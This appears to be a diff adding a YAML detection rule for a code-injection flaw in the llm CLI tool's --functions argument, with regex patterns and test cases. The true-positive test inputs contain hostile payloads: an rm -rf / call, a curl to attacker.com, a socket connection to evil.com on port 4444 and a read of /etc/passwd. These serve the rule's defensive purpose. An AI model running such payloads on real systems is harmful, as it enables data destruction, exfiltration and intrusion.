@@ -1,0 +1,104 @@
+title: The llm CLI tool thru 0.27.1 contains a critical code injection vulnerability via its --functions command-line
+id: ATR-2026-00565
+rule_version: 1
+status: experimental
+description: 'NVD-tracked CVE CVE-2026-31236 (CVSS v3 9.8 (CRITICAL)). The llm CLI tool thru 0.27.1 contains a critical code injection vulnerability via its --functions command-line argument. This argument is intended to allow users to provide custom Python function definitions. However, the tool directly executes the provided code using the unsafe exec() function without any sanitization, sandboxing, or security restrictions. An attacker can exploit this by crafting a malicious llm command with arbitrary Python code in the --functions argument and using social engineering to trick a victim into running it. This leads to arbitrary code execution on the victim''s s
+
+  '
+author: ATR Community (NVD sync)
+date: 2026/05/30
+schema_version: '0.1'
+detection_tier: pattern
+maturity: experimental
+severity: critical
+references:
+  cve:
+  - CVE-2026-31236
+  cwe:
+  - CWE-94
+  external:
+  - https://github.com/simonw/llm
+  - https://www.notion.so/CVE-2026-31236-35d1e139318881a4a0f1fffcf671f7e3
+metadata_provenance:
+  cve: nvd-sync
+  cwe: nvd-sync
+tags:
+  category: skill-compromise
+  subcategory: nvd-imported
+  scan_target: mcp
+  confidence: medium
+agent_source:
+  type: llm_io
+  framework:
+  - any
+  provider:
+  - any
+detection:
+  condition: any
+  false_positives: []
+  conditions:
+  - field: content
+    operator: regex
+    value: (?i)--functions\s*[=\s]\s*['\"]?(?!\s*\(\s*\))[^'\"]*(?:__import__|exec|eval|compile|subprocess|os\.system|open\s*\(|globals\(|locals\(|vars\(|dir\(|getattr|setattr|delattr|classmethod|staticmethod|property|type\(|object\.__class__|__builtins__|sys\.path)
+    description: Detects --functions argument containing dangerous built-in functions or module access patterns that enable code injection via exec() exploitation.
+  - field: content
+    operator: regex
+    value: (?i)--functions\s*[=\s]\s*['\"]?[^'\"]*\b(?:import\s+(?:subprocess|socket|ctypes|pickle|marshal|importlib|__main__|runpy)|from\s+(?:subprocess|socket|ctypes|pickle|marshal|importlib|runpy)\s+import)
+    description: Detects --functions argument with imports of modules commonly used to escape sandbox or execute system commands.
+  - field: content
+    operator: regex
+    value: (?i)--functions\s*[=\s]\s*['\"]?[^'\"]*\b(?:open\s*\(\s*['\"][^'\"]*['\"]\s*,\s*['\"]w|chmod|chown|rmdir|system\(|popen\(|spawn)
+    description: Detects --functions argument with file/process manipulation patterns that indicate arbitrary code execution intent.
+response:
+  actions:
+  - block_input
+  - alert
+  notify:
+  - security_team
+test_cases:
+  true_positives:
+  - input: --functions "__import__('os').system('rm -rf /')"
+    expected: triggered
+    description: LLM-authored attack sample 1
+  - input: '--functions=''def f(): import subprocess; subprocess.call(["curl", "attacker.com"])'''
+    expected: triggered
+    description: LLM-authored attack sample 2
+  - input: --functions 'exec("import socket; s=socket.socket(); s.connect((\"evil.com\", 4444))")'
+    expected: triggered
+    description: LLM-authored attack sample 3
+  - input: --functions="from ctypes import *; CDLL(None).system('whoami')"
+    expected: triggered
+    description: LLM-authored attack sample 4
+  - input: --functions 'open("/etc/passwd", "r").read()'
+    expected: triggered
+    description: LLM-authored attack sample 5
+  - input: --functions="globals()['__builtins__']['eval']('malicious_code')"
+    expected: triggered
+    description: LLM-authored attack sample 6
+  - input: --functions=compile('import os; os.system("id")', 'x', 'exec')
+    expected: triggered
+    description: LLM-authored attack sample 7
+  true_negatives:
+  - input: '--functions ''def add(a, b): return a + b'''
+    expected: not_triggered
+    description: LLM-authored benign sample 1
+  - input: '--functions="def greet(name): return f''Hello, {name}''"'
+    expected: not_triggered
+    description: LLM-authored benign sample 2
+  - input: "--functions='import json\ndef parse(text):\n    return json.loads(text)'"
+    expected: not_triggered
+    description: LLM-authored benign sample 3
+  - input: "--functions=\"from typing import List\ndef process(items: List[str]) -> str:\n    return ', '.join(items)\""
+    expected: not_triggered
+    description: LLM-authored benign sample 4
+  - input: "--functions 'def multiply(x, y):\n    \"\"\"Multiply two numbers.\"\"\"\n    return x * y'"
+    expected: not_triggered
+    description: LLM-authored benign sample 5
+  - input: "import math\ndef calculate(radius):\n    return math.pi * radius ** 2"
+    expected: not_triggered
+    description: LLM-authored benign sample 6
+confidence: 60
+_llm_authored:
+  model: claude-haiku-4-5-20251001
+  generalization_note: 'This rule generalizes beyond a single PoC by detecting the fundamental attack pattern: the --functions CLI argument paired with dangerous Python introspection/execution primitives (__import__, exec, eval, compile, subprocess, os.system) or sensitive module imports (subprocess, socket, ctypes, pickle). It captures variations in quoting, spacing, and function composition while maintaining zero false positives on legitimate function definitions, library imports, and standard Python usage.'
+  note: Generation-time LLM authoring; verified by deterministic gate. Runtime detection is pure regex. Human review required before merge.
